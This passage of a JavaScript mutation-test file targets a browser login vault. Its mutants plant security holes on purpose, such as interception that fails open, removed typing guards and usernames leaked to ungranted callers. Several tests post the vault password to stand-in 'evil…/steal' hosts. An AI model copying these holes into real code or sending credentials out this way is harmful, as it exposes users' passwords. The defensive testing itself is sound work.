    'if (e.enabled) { await syncTabFetchMode(w, e);', "if (e.enabled) { await call(w, 'Fetch.disable', {}, e.sid);", "src/server/browser-dialogs.js"),
    '  function armPrompts(w, e) {\n    if (!e.sid) return;\n    call(w, \'Page.setInterceptFileChooserDialog\', { enabled: true }, e.sid).then((r) => { if (r && r.error) say(\'fc:\' + r.error.message, `${w.profileId}: the file chooser was not hooked — ${r.error.message}`); });\n    syncTabFetchMode(w, e);',
      '  function armPrompts(w, e) {\n    if (!e.sid) return;\n    call(w, \'Fetch.enable\', { patterns: [{ urlPattern: \'*\', resourceType: \'Document\', requestStage: \'Request\' }], handleAuthRequests: true }, e.sid);', "src/server/browser-dialogs.js");
  const BD_M11 = m11BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m11BdSrc, 'n1-toperson-bypasses-sync') : null;

  // Mutant 12 (N2): `noteSnapshot` calls `Accessibility.getFullAXTree` over the watch socket (r23's bug) -> 3,000-row page drops watch with 1009!
  const m12BdSrc = editAnchor(bdSrc,
    '      writeSnapshotRefs(w, e, specs, { seq, at });', // B-21cc (r2849): a NAMED note writes the tab's references here
    '      await call(w, \'Accessibility.getFullAXTree\', { frameId: e.targetId }, e.sid);\n      writeSnapshotRefs(w, e, specs, { seq, at });'
  , "src/server/browser-dialogs.js");
  const BD_M12 = m12BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m12BdSrc, 'n2-snapshot-full-ax-on-watch') : null;

  // Mutant 13 (N4): `json_too_many_nodes` limit returns `{ carries: false, undecodable: false }` -> cross-origin >4096-node JSON fails open!
  const m13BdSrc = editAnchor(csSrc,
    "return { carries: false, undecodable: true, reason: 'json_too_many_nodes' };",
    "return { carries: false, undecodable: false, format: 'json' };"
  , "src/cdp-frame-scrub.js");
  const BD_M13 = m13BdSrc !== csSrc ? MUT.load('src/cdp-frame-scrub.js', m13BdSrc, 'n4-json-cap-fails-open') : null;

  // Mutant 14 (m2): omit `Network.disable` when `wantCred` drops -> `Network.*` stays enabled after fence lifts!
  const m14BdSrc = editAnchor(bdSrc,
    "ops.push(call(w, 'Network.disable', {}, e.sid, interceptTimeoutMs).catch(() => {}));",
    '/* m2 mutant: Network.disable omitted */'
  , "src/server/browser-dialogs.js");
  const BD_M14 = m14BdSrc !== bdSrc ? MUT.load('src/server/browser-dialogs.js', m14BdSrc, 'm2-network-never-disabled') : null;

  // Mutant 15 (N5): strip post-prepare `inert` + `onTypingFocusGuard` + `onTargetBlurGuard` -> post-prepare macrotask decoy receives `Input.insertText`!
  const m15LfSrc = editAnchor(editAnchor(editAnchor(editAnchor(editAnchor(lfSrc,
    'try { node.inert = true; } catch {}', '/* inert off */', "src/server/browser-login-fill.js", 'all'),
    "try { if (node.setAttribute) node.setAttribute('inert', ''); } catch {}", '/* attr off */', "src/server/browser-login-fill.js", 'all'),
    "window.addEventListener('focusin', onTypingFocusGuard, true);", '/* focusin off */', "src/server/browser-login-fill.js"),
    "window.addEventListener('focus', onTypingFocusGuard, true);", '/* focus off */', "src/server/browser-login-fill.js"),
    "el.addEventListener('blur', onTargetBlurGuard, true);", '/* blur off */', "src/server/browser-login-fill.js");
  const LF_M15 = m15LfSrc !== lfSrc ? MUT.load('src/server/browser-login-fill.js', m15LfSrc, 'n5-typing-guard-removed') : null;

  // Mutant 16 (m3): `dialogAnswerFor` omits `else if (started) D.verbStarted` -> `fill --vault` `/audit` decrements parallel verb!
  const rbSrc = fs.readFileSync(path.join(REPO, 'src/routes/browser.js'), 'utf8');
  const m16RbSrc = editAnchor(rbSrc,
    'else if (started) D.verbStarted(',
    'else if (false && started) D.verbStarted('
  , "src/routes/browser.js");
  const RB_M16 = m16RbSrc !== rbSrc ? MUT.load('src/routes/browser.js', m16RbSrc, 'm3-unpaired-verb-ended') : null;

  // Mutant 17 (m6): `addOwn` skips checking whether `totp:<totpName>` exists in the vault -> saves dangling `totpName`!
  const lgSrc = fs.readFileSync(path.join(REPO, 'src/server/browser-logins.js'), 'utf8');
  const m17LgSrc = editAnchor(lgSrc,
    "if (!tl.some((s) => s && s.name === `totp:${str(totpName)}`)) {",
    "if (false && !tl.some((s) => s && s.name === `totp:${str(totpName)}`)) {"
  , "src/server/browser-logins.js");
  const LG_M17 = m17LgSrc !== lgSrc ? MUT.load('src/server/browser-logins.js', m17LgSrc, 'm6-dangling-totp-allowed') : null;

  // Mutant 18 (m7): `fillVerdict` checks `onSite.length > 1` BEFORE grant check -> discloses usernames to ungranted caller!
  const m18BlSrc = editAnchor(blSrc,
    '      const admitted = [];',
    "      if (onSite.length > 1) return no('login_ambiguous', `${onSite.length} logins match ${spec.origin} (${onSite.map((e) => e.user).slice(0, 5).join(', ')})`);\n      const admitted = [];"
  , "src/browser-login.js");
  const BL_M18 = m18BlSrc !== blSrc ? MUT.load('src/browser-login.js', m18BlSrc, 'm7-ambiguous-leaks-users') : null;

  {
    const dirM10 = scratch('vl-r24-m10-15');
    fs.rmSync(dirM10, { recursive: true, force: true });
    fs.mkdirSync(dirM10, { recursive: true });
    const fkR24 = await startFakeKernel({ firstUrl: 'https://shop.example.test/login', mode: { standard: true } });
    const engR24 = VE.create({ dataDir: dirM10, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false });
    await engR24.setup('MutR24#Pass9');
    try {
      const gR24 = GS.create({ memory: true });
      const logR24 = Lm.create({ vault: engR24, grants: () => gR24, log: () => {} });
      const PW_M = 'MutR24Secret!' + crypto.randomBytes(4).toString('hex');
      logR24.addOwn({ origin: 'https://shop.example.test', username: 'alice', password: PW_M }, { who: 'owner' });
      logR24.grant('web-login:https://shop.example.test#alice', 'any-account', 'session:conv-mr24');
      let holdersM = [{ browserKey: 'bk-mr24', sessionId: 's-mr24' }];
      const skR24 = {
        cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
        onLease: () => () => {},
        saveLoginFenceState() {},
        loginFenceStateOf: () => null,
        loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), action }),
      };
      const tidR24 = fkR24.targets()[0].targetId;

      // Judge M10 (N1 hold relaxes wantCred)
      if (BD_M10) {
        const dom10 = () => fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }, { id: 'big', tag: 'textarea', type: 'textarea', name: 'Big', value: 'x'.repeat(2400) }] });
        const make10 = (extra = {}) => BD_M10.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24, wipeMaxScanPositions: 256, ...extra });
        const fill10 = async (w, pid) => { await w.arm(pid); w.noteActiveTab({ profileId: pid, browserKey: 'bk-mr24' }, tidR24); await w.fillVaultField({ profileId: pid, browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } }); };
        const submit10 = () => fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch', finish: true });
        const fetchModeSince = (m) => fkR24.calls().filter((c) => c.seq > m && c.tab === tidR24 && (c.method === 'Fetch.enable' || c.method === 'Fetch.disable'));
        // the flake census r2's find: the copy sends its relaxed Fetch mode only AFTER the paused fetch is answered, and the 40 ms after
        // the first submit was a guess that it had reached the kernel. PLACED (at will), on a watch of its own: that send HELD off the
        // wire, the leg as it stood (40 ms, then the foreign POST) reads the copy's red away — the POST is still intercepted
        {
          dom10();
          const hs10 = heldSends(['Fetch.enable', 'Fetch.disable']);
          const w10p = make10({ WebSocketImpl: hs10.Impl });
          await fill10(w10p, 'bp-m10p');
          hs10.hold();
          await submit10();
          await new Promise((r) => setTimeout(r, 40));   // the leg as it stood
          const heldLeak = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m10p.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
          const heldMode = await untilFact(() => hs10.held.some(fetchOffCred), 'MUTANT 10 PLACED: the copy\'s relaxed Fetch mode reached the hold');
          const heldN = hs10.held.length;
          const m10p = fkR24.mark(); hs10.release();
          await untilFact(() => fetchModeSince(m10p).length >= heldN, 'MUTANT 10 PLACED: the released mode at the kernel');
          ok(!!heldMode && heldN >= 1 && heldLeak.action !== 'unwatched', 'PLACED (MUTANT 10, the census\'s find at will): the copy\'s relaxed Fetch mode HELD off the wire — the leg as it stood (40 ms after the first submit) sends the foreign POST into a kernel that still intercepts it, and the copy\'s red reads away', { heldN, heldLeak });
          w10p.shutdown();
          await untilFact(() => (fkR24.targets().find((t) => t.targetId === tidR24) || {}).attached === false, 'MUTANT 10 PLACED: the placement\'s session gone from the tab');
        }
        dom10();
        const w10 = make10();
        await fill10(w10, 'bp-m10');
        const m10 = fkR24.mark();
        await submit10();
        await untilFact(() => fetchModeSince(m10).some(fetchOffCred), 'MUTANT 10: the copy\'s relaxed Fetch mode (off the credential patterns, after the hold) at the kernel');
        const leak10 = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m10.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
        ok(leak10.action === 'unwatched', 'MUTANT 10 RED (N1 hold-relaxes-fetch): relaxing wantCred on holdReason lets foreign Fetch bypass interception', { leak10, modeHeard: fetchModeSince(m10).map((c) => c.method) });
        w10.shutdown();
      } else ok(false, 'MUTANT 10 RED (N1a): anchor not found');

      // Judge M11 (N1 toPerson bypasses syncTabFetchMode)
      if (BD_M11) {
        holdersM = [{ browserKey: 'bk-mr24', sessionId: 's-mr24' }];
        fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
        const w11 = BD_M11.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => holdersM.filter((h) => !h.human).length, logins: logR24 });
        await w11.arm('bp-m11');
        w11.noteActiveTab({ profileId: 'bp-m11', browserKey: 'bk-mr24' }, tidR24);
        await w11.fillVaultField({ profileId: 'bp-m11', browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
        holdersM = [{ browserKey: 'bk-h', human: true, input: 'user' }];
        const m11 = fkR24.mark();
        await w11.arm('bp-m11');
        await untilFact(() => fkR24.calls().some((c) => c.seq > m11 && c.tab === tidR24 && c.method === 'Fetch.disable'), 'MUTANT 11: the copy\'s raw Fetch.disable at the person\'s flip, at the kernel');   // the flake census r2: was a 25 ms guess
        holdersM = [{ browserKey: 'bk-mr24', sessionId: 's-mr24' }];
        await w11.arm('bp-m11');   // (the flip back's 25 ms guarded nothing: arm waits for its own move, and either word the copy leaves at the kernel — the person's Fetch.disable, its armPrompts' Document-only enable — leaves a Fetch POST unwatched)
        const leak11 = await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://evil-m11.example.test/steal', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch' });
        ok(leak11.action === 'unwatched', 'MUTANT 11 RED (N1 toPerson-bypasses-sync): stale fetchMode after agent->person->agent leaves foreign Fetch unwatched', leak11);
        w11.shutdown();
      } else ok(false, 'MUTANT 11 RED (N1b): anchor not found');

      // Judge M12 (N2 getFullAXTree over watch socket on 3,000-row page)
      if (BD_M12) {
        const bigEls = Array.from({ length: 3000 }, (_, i) => ({ id: `r${i}`, tag: 'input', type: 'text', name: `row ${i}` }));
        fkR24.setDom(tidR24, { url: 'https://shop.example.test/big', elements: bigEls, axPadBytes: 6000 });
        const evs12 = [];
        const w12 = BD_M12.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
        w12.onChange((ev) => evs12.push(ev));
        await w12.arm('bp-m12');
        const m0 = fkR24.mark();
        await w12.noteSnapshot({ profileId: 'bp-m12', browserKey: 'bk-mr24' }, { parsedRefs: [{ ref: '@e1', role: 'textbox', name: 'row 0', nth: 0 }], targetId: tidR24 });
        await untilFact(() => evs12.some((x) => x.kind === 'down') && fkR24.calls().some((c) => c.seq > m0 && c.method === 'Accessibility.getFullAXTree'), 'MUTANT 12: the copy\'s getFullAXTree at the kernel and the watch dropped');   // the flake census r2: was a 30 ms guess
        const ax12 = fkR24.calls().filter((c) => c.seq > m0 && c.method === 'Accessibility.getFullAXTree').length;
        const down12 = evs12.some((x) => x.kind === 'down');
        ok(ax12 >= 1 && down12 === true, 'MUTANT 12 RED (N2 snapshot-full-ax-on-watch): getFullAXTree on snapshot calls Accessibility.* and drops watch (1009) on 3,000-row page', { ax12, down12 });
        w12.shutdown();
      } else ok(false, 'MUTANT 12 RED (N2): anchor not found');

      // Judge M13 (N4 json scan cap fails open)
      if (BD_M13) {
        const bigJson = JSON.stringify(Array.from({ length: Dm.SCAN_LIMITS.maxJsonNodes + 5 }, () => 0));
        const realIr = Dm.inspectRequestBody(bigJson, [Dm.credSigOf(PW_M)], 'application/json', { hasPostData: true });
        const mutIr = BD_M13.inspectRequestBody(bigJson, [BD_M13.credSigOf(PW_M)], 'application/json', { hasPostData: true });
        ok(realIr.undecodable === true && mutIr.undecodable === false,
          'MUTANT 13 RED (N4 json-cap-fails-open): real fails closed at >4096 JSON nodes; mutant answers undecodable:false and lets foreign body pass',
          { realIr, mutIr });
      } else ok(false, 'MUTANT 13 RED (N4): anchor not found');

      // Judge M14 (m2 Network.disable omitted)
      if (BD_M14) {
        fkR24.setDom(tidR24, { url: 'https://shop.example.test/login', elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
        const w14 = BD_M14.create({ keeper: skR24, log: quiet, enableTimeoutMs: 400, holdersOf: () => holdersM, leaseCountOf: () => 1, logins: logR24 });
        await w14.arm('bp-m14');
        w14.noteActiveTab({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, tidR24);
        await w14.fillVaultField({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { targetId: tidR24, target: '#pw', spec: 'shop.example.test#alice/password', facts: { conversationKeys: ['conv-mr24'] } });
        const m0 = fkR24.mark();
        await fkR24.simulateSubmitRequest({ targetId: tidR24, url: 'https://shop.example.test/api/login', postData: `pw=${encodeURIComponent(PW_M)}`, resourceType: 'Fetch', finish: true });
        const lifted14 = await untilFact(() => w14.liveFillVerdictFor({ profileId: 'bp-m14', browserKey: 'bk-mr24' }, { verb: 'eval', argv: ['eval', '1'] }).ok, 'MUTANT 14: the fence lifted');   // the flake census r2: was 40 × 10 ms (a lift that never came read «no Network.disable» for the copy's red)
        // 主开发 r4597 (an absence is read only once the product COULD have done it): the lift's own sync sends a Network.disable FIRST and
        // its Fetch mode change after it, on the one socket — so «no Network.disable» is read once the kernel heard THAT Fetch call (the
        // tab off the credential patterns: a Fetch.disable, or an enable of Document requests only — no earlier mode of the fill is one)
        const synced14 = await untilFact(() => fkR24.calls().some((c) => c.seq > m0 && c.tab === tidR24 && fetchOffCred(c)), 'MUTANT 14: the lift\'s own Fetch mode at the kernel (sent after where its Network.disable goes)');
        const netDis14 = fkR24.calls().filter((c) => c.seq > m0 && c.method === 'Network.disable').length;
        // 主开发 r4600 (half two): the judge is an ABSENCE, so the two waits' own results are judged with it — a lift that never came (or
        // its sync never heard) is a failing line BY NAME, never «no Network.disable» read off a lift that did not happen
        ok(!!lifted14 && !!synced14 && netDis14 === 0, 'MUTANT 14 RED (m2 network-never-disabled): without Network.disable on fence lift, Network domain stays enabled forever' + (lifted14 && synced14 ? '' : ` — ${lifted14 ? 'the lift\'s own sync never reached the kernel' : 'THE LIFT NEVER CAME'}, so the absence proves nothing`), { netDis14, lifted: !!lifted14, synced: !!synced14 });
        w14.shutdown();
      } else ok(false, 'MUTANT 14 RED (m2): anchor not found');

      // Judge M15 (N5 post-prepare typing guard removed)
      if (LF_M15) {
        fkR24.mode.preInsertDelayMs = 25;
        fkR24.setDom(tidR24, {
          url: 'https://shop.example.test/login',
          elements: [
            { id: 'decoy', tag: 'input', type: 'text', name: 'Decoy' },
            { id: 'trap', tag: 'input', type: 'password', name: 'Trap', focusHijackId: 'decoy', focusHijackMode: 'post-prepare', postPrepareAttack: 'strip-inert' },
          ],
        });
        const WebSocket = require(path.join(REPO, 'node_modules/ws'));
        const ws15 = new WebSocket(fkR24.wsUrl);
        await new Promise((r) => ws15.once('open', r));
        let seq15 = 0;
        const pend15 = new Map();
        ws15.on('message', (raw) => { const m = JSON.parse(String(raw)); if (m.id && pend15.has(m.id)) { const fn = pend15.get(m.id); pend15.delete(m.id); fn(m); } });
        const send15 = (method, params = {}, sid = undefined) => new Promise((r) => { const id = ++seq15; pend15.set(id, r); ws15.send(JSON.stringify({ id, method, params, ...(sid ? { sessionId: sid } : {}) })); });
        const att15 = await send15('Target.attachToTarget', { targetId: tidR24, flatten: true });
        const sid15 = att15.result.sessionId;
        await LF_M15.fillVaultElement({
          call: (m, p) => send15(m, p, sid15), browserCall: (m, p) => send15(m, p),
          targetId: tidR24, trackedUrl: 'https://shop.example.test/login',
          origin: 'https://shop.example.test', target: '#trap', slot: 'current', value: PW_M, secret: true,
        });
        const counts15 = fkR24.readDomInputCounts(tidR24);
        ws15.close();
        fkR24.mode.preInsertDelayMs = 0;
        ok((counts15.decoy?.inputEvents || 0) >= 1, 'MUTANT 15 RED (N5 typing-guard-removed): without inert + capture focus/blur guards, Input.insertText lands in post-prepare macrotask decoy', counts15);
      } else ok(false, 'MUTANT 15 RED (N5): anchor not found');

      // Judge M16 (m3 unpaired verbEnded on fill --vault /audit)
      if (RB_M16 && typeof RB_M16.setup === 'function') {
        const express = require(path.join(REPO, 'node_modules/express'));
        const prof16 = { id: 'bp-000016bb', label: 'M16' };
        const k16 = {
          clock: () => Date.now(),
          profileByRef: (r) => (r === 'bp-000016bb' || r === 'shop' ? prof16 : null),
          profile: (id) => (id === 'bp-000016bb' ? prof16 : null),
          setFor: () => ({ attachments: [{ profileId: 'bp-000016bb', alias: 'shop', label: 'M16', isDefault: true }], handles: ['shop'] }),
          resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: 'bp-000016bb', alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
          attach: async () => ({ profile: prof16, browser: { state: 'ready' }, lease: { profileId: 'bp-000016bb', browserKey: 'bk-000016aa', sessionId: 's-m16', since: 1 }, env: [], pinTab: false, others: 0 }),
          cdpEndpointFor: async () => ({ ok: true, url: fkR24.wsUrl }),
          socketRootOf: () => ({ socketDir: path.join(dirM10, 'ab'), runtimeDir: dirM10 }),
          configFileFor: () => null,
          audit() {},
          noteLeaseUrl() {},
          tell() {},
          leasesFor: () => [{ profileId: 'bp-000016bb', browserKey: 'bk-000016aa', sessionId: 's-m16' }],
          statusFor: () => ({ ephemeral: null, leases: [{ profileId: 'bp-000016bb', browserKey: 'bk-000016aa', sessionId: 's-m16' }] }),
          inputStateFor: () => ({ input: 'agent', takenAt: 0 }),
          ephemeralFor: () => null,
          onLease: () => () => {},
          saveLoginFenceState() {},
          loginFenceStateOf: () => null,
          loginChannelFor: ({ ephemeral = false, remoteSession = false, action = 'fill' } = {}) => stubLoginChannel({ ephemeral, remoteSession, hasCdp: Boolean(fkR24.wsUrl), label: 'M16', action }),
        };
        const w16 = Dm.create({ keeper: k16, log: quiet, enableTimeoutMs: 400, holdersOf: () => [{ browserKey: 'bk-000016aa', sessionId: 's-m16' }], leaseCountOf: () => 1, logins: logR24 });
        const tok16 = 'vsst_' + crypto.randomBytes(12).toString('hex');
        const sess16 = { agentToken: tok16, _browserKey: 'bk-000016aa', _browserVariant: 'D', name: 'M16 Agent', cwd: dirM10, backendSessionId: 'conv-mr24' };
        RB_M16.setup({ keeper: k16, activeSessions: new Map([['s-m16', sess16]]), dialogs: w16, logins: logR24, tasksForSession: () => [] });
        const app16 = express();
        app16.use(express.json());
        app16.use(RB_M16.router);
        const srv16 = await new Promise((r) => { const s = app16.listen(0, '127.0.0.1', () => r(s)); });
        try {
          const port16 = srv16.address().port;
          const post16 = async (u, body) => {
            const resp = await fetch(`http://127.0.0.1:${port16}${u}`, {
              method: 'POST',
              headers: { 'content-type': 'application/json', authorization: `Bearer ${tok16}` },
              body: JSON.stringify(body),
            });
            return resp.json();
          };
          const rW = await post16('/api/agent/browser/resolve', { handle: 'shop', argv: ['wait', '5000'], wrapper: true });
          const runningBefore = w16.verbRunning('bk-000016aa');
          const pF = await post16('/api/agent/browser/fill-vault', { prepare: true, handle: 'shop', target: '#pw', spec: 'shop.example.test#alice/password' });
          const rF = await post16('/api/agent/browser/resolve', { handle: 'shop', argv: ['fill', '#pw', '--vault', 'shop.example.test#alice/password'], wrapper: true, fillTicket: pF.fillTicket });
          await post16('/api/agent/browser/audit', { profile: 'bp-000016bb', verb: 'fill', ok: true, since: rF.at || 1 });
          const runningAfter = w16.verbRunning('bk-000016aa');
          void rW;
          ok(runningBefore === true && runningAfter === false,
            'MUTANT 16 RED (m3 unpaired-verb-ended): without started:true on vaultFill /resolve, /audit prematurely drops parallel verbRunning() to false',
            { runningBefore, runningAfter });
        } finally {
          srv16.close();
          w16.shutdown();
        }
      } else ok(false, 'MUTANT 16 RED (m3): anchor not found');

      // Judge M17 (m6 addOwn dangling totpName)
      if (LG_M17) {
        const logM17 = LG_M17.create({ vault: engR24, grants: () => gR24, log: () => {} });
        const mutAdd17 = logM17.addOwn({ origin: 'https://shop.example.test', username: 'dangling2fa', password: PW_M, totpName: 'ghost-totp' }, { who: 'owner' });
        ok(mutAdd17.ok === true, 'MUTANT 17 RED (m6 dangling-totp-allowed): without Vault existence check, addOwn seals dangling totpName', mutAdd17);
      } else ok(false, 'MUTANT 17 RED (m6): anchor not found');

      // Judge M18 (m7 login_ambiguous leaks usernames before grant check) + r25 refused-fill `usesOf` privacy + Mutant 23 RED!
      if (BL_M18) {
        const ent18 = [
          { name: 'web-login:https://shop.example.test#secret_user_a', origin: 'https://shop.example.test', user: 'secret_user_a', owner: null },
          { name: 'web-login:https://shop.example.test#secret_user_b', origin: 'https://shop.example.test', user: 'secret_user_b', owner: null },
        ];
        const sp18 = BL_M18.parseVaultFillSpec('shop.example.test/password');
        const real18 = BL.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: sp18, entries: ent18, grantRows: () => [], facts: { conversationKeys: ['ungranted'] }, vaultState: 'unlocked' });
        const mut18 = BL_M18.fillVerdict({ tabOrigin: 'https://shop.example.test', spec: sp18, entries: ent18, grantRows: () => [], facts: { conversationKeys: ['ungranted'] }, vaultState: 'unlocked' });
        ok(real18.code === 'login_not_granted' && !real18.error.includes('secret_user_a')
          && mut18.code === 'login_ambiguous' && mut18.error.includes('secret_user_a'),
          'MUTANT 18 RED (m7 ambiguous-leaks-users): checking ambiguity before grant discloses usernames to ungranted agent',
          { realCode: real18.code, mutCode: mut18.code });
      } else ok(false, 'MUTANT 18 RED (m7): anchor not found');

      {
        logR24.addOwn({ origin: 'https://shop.example.test', username: 'secret_bob', password: PW_M }, { who: 'owner' });
        const rfSite = logR24.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test/password', conv: 'conv-ungranted', actor: 'Ungranted', facts: { conversationKeys: ['conv-ungranted'] } });
        const rfNamed = logR24.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test#secret_bob/password', conv: 'conv-ungranted', actor: 'Ungranted', facts: { conversationKeys: ['conv-ungranted'] } });
        const rfNew = logR24.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'new:shop.example.test#secret_eve/password', generate: true, conv: 'conv-ungranted', actor: 'Ungranted', facts: { conversationKeys: ['conv-ungranted'] } });
        const usesUngranted = engR24.usesOf('conv-ungranted');
        const usesJson = JSON.stringify(usesUngranted);
        ok(!rfSite.ok && rfSite.code === 'login_not_granted' && !rfSite.error.includes('alice') && !rfSite.error.includes('secret_bob')
          && !rfNamed.ok && rfNamed.code === 'login_not_granted' && rfNamed.name === undefined
          && !rfNew.ok && rfNew.code === 'login_not_granted' && rfNew.name === undefined
          && Array.isArray(usesUngranted) && usesUngranted.length === 3
          && usesUngranted.every((u) => u.entry === 'web-login:https://shop.example.test' && u.outcome === 'not_granted')
          && !usesJson.includes('alice') && !usesJson.includes('secret_bob') && !usesJson.includes('secret_eve') && !usesJson.includes('#'),
          'r25 (refused-fill uses privacy): refused ungranted fills (site-level, #user, and new:#user) record web-login:<origin> in vault-audit.jsonl and NEVER expose #<user> in usesOf(conv)',
          { rfSite, rfNamed, rfNew, usesUngranted });

        // Mutant 23 (r25): record `web-login:<origin>#<user>` on `login_not_granted` -> `usesOf(conv)` leaks `#<user>` back to ungranted caller!
        const m23LgSrc = editAnchor(lgSrc,
          'use(`${BL.PREFIX}${siteOrigin}`, { conv, actor, outcome: \'not_granted\', purpose: purposeOf(parsed.field, siteOrigin, profileId) });',
          'use(`${BL.PREFIX}${siteOrigin}#${parsed.user || (allEntries[0] && allEntries[0].user) || \'leaked\'}`, { conv, actor, outcome: \'not_granted\', purpose: purposeOf(parsed.field, siteOrigin, profileId) });'
        , "src/server/browser-logins.js");
        const LG_M23 = m23LgSrc !== lgSrc ? MUT.load('src/server/browser-logins.js', m23LgSrc, 'r25-refused-fill-uses-leaks-user') : null;
        if (LG_M23) {
          const logM23 = LG_M23.create({ vault: engR24, grants: () => gR24, log: () => {} });
          logM23.resolveFill({ tabOrigin: 'https://shop.example.test', spec: 'shop.example.test/password', conv: 'conv-mut23', actor: 'Mut23', facts: { conversationKeys: ['conv-mut23'] } });
          const mutUses23 = engR24.usesOf('conv-mut23');
          ok(Array.isArray(mutUses23) && mutUses23.some((u) => /#alice/.test(String(u.entry || ''))),
            'MUTANT 23 RED (r25 refused-fill-uses-leaks-user): recording web-login:<origin>#<user> on refused fill leaks #<user> through vibespace-vault uses',
            mutUses23);
        } else ok(false, 'MUTANT 23 RED (r25): anchor not found');
      }

      // ── r25 DEDICATED PINS & RED MUTANTS (A1, A2, A3, A4, A5) ──
      // A4: `.388` (`master`) `recordOf` rollback oracle + `schema: 1|2` + `0` `secretPut` on legacy fill
      {
        const master388RecordOf = (text) => {
          let r; try { r = typeof text === 'string' ? JSON.parse(text) : text; } catch { return null; }
          if (!r || typeof r !== 'object' || r.v !== 1) return null;
          const origin = BL.originOf(r.origin);
          if (!origin || origin !== r.origin || typeof r.username !== 'string' || !r.username || r.username.length > 256 || typeof r.password !== 'string' || !r.password || r.password.length > 4096) return null;
          const out = { v: 1, origin, username: r.username, password: r.password };
          if (typeof r.totpName === 'string' && /^[\w.-]{1,120}$/.test(r.totpName)) out.totpName = r.totpName;
          if (r.previous && typeof r.previous === 'object' && typeof r.previous.password === 'string' && r.previous.password) out.previous = { password: r.previous.password };
          return out;
        };

        const rOwn = BL.newRecord({ origin: 'https://shop.example.test', username: 'rb_own', password: 'Own#Password1', totpName: 'shop-2fa', source: 'owner', now: 100 });
        const rReg = BL.newRecord({ origin: 'https://shop.example.test', username: 'rb_reg', password: 'Reg#Password2', source: 'vault-minted', pending: 'register', now: 101 });
        const rChg = BL.mintChangeRecord(rOwn, 'Chg#Password3', { now: 102 }).record;
        const rCfm = BL.confirmPendingRecord(rChg, { now: 103 }).record;

        const mOwn = master388RecordOf(BL.textOf(rOwn));
        const mReg = master388RecordOf(BL.textOf(rReg));
        const mChg = master388RecordOf(BL.textOf(rChg));
        const mCfm = master388RecordOf(BL.textOf(rCfm));
        const rawOwnJson = JSON.parse(BL.textOf(rOwn));
        ok(rawOwnJson.v === 1 && rawOwnJson.schema === 2
          && mOwn?.password === 'Own#Password1' && mOwn?.totpName === 'shop-2fa'
          && mReg?.password === 'Reg#Password2'
          && mChg?.password === 'Own#Password1' && mChg?.totpName === 'shop-2fa'
          && mCfm?.password === 'Chg#Password3' && mCfm?.previous?.password === 'Own#Password1',
          'A4 (rollback): all 4 tip-written record states (addOwn, register, change, confirm) carry v:1, schema:2 and read back in .388 recordOf with active password, totpName, and previous',
          { mOwn, mReg, mChg, mCfm });

        // Legacy `.388` (`schema: 1`) record filled on tip -> 0 `secretPut` calls and remains readable by `.388` `recordOf`!
        const legacyName = BL.entryName('https://legacy388.example.test', 'olduser');
        const legacyJson = JSON.stringify({
          v: 1, origin: 'https://legacy388.example.test', username: 'olduser', password: 'Legacy388!Password9',
          createdAt: 50, by: 'owner', source: 'owner', strength: 'unknown', submittedAt: 50, lastUsedAt: null, totpName: 'legacy-2fa',
        });
        const parsedLegacy = BL.recordOf(legacyJson);
        engR24.secretPut(legacyName, legacyJson, { kind: 'owner' });
        logR24.grant(legacyName, 'this-account', 'session:conv-mr24');
        let secretPutCountOnFill = 0;
        const origPut = engR24.secretPut.bind(engR24);
        engR24.secretPut = (...a) => { secretPutCountOnFill++; return origPut(...a); };
        let fillLegacy;
        try {
          logR24.names();
          fillLegacy = logR24.resolveFill({
            tabOrigin: 'https://legacy388.example.test',
            spec: 'legacy388.example.test#olduser/password',
            facts: { conversationKeys: ['conv-mr24'] },
            checkOnly: false,
          });
          fillLegacy?.noteFillUse?.();
        } finally {
          engR24.secretPut = origPut;
        }
        const storedAfterFill = engR24.secretGet(legacyName).value.toString('utf8');
        const masterReadsAfterFill = master388RecordOf(storedAfterFill);
        ok(parsedLegacy?.schema === 2 && JSON.stringify(BL.recordOf(parsedLegacy)) === JSON.stringify(parsedLegacy)
          && fillLegacy?.ok === true && fillLegacy.value === 'Legacy388!Password9'
          && secretPutCountOnFill === 0 && masterReadsAfterFill?.password === 'Legacy388!Password9' && masterReadsAfterFill?.totpName === 'legacy-2fa',
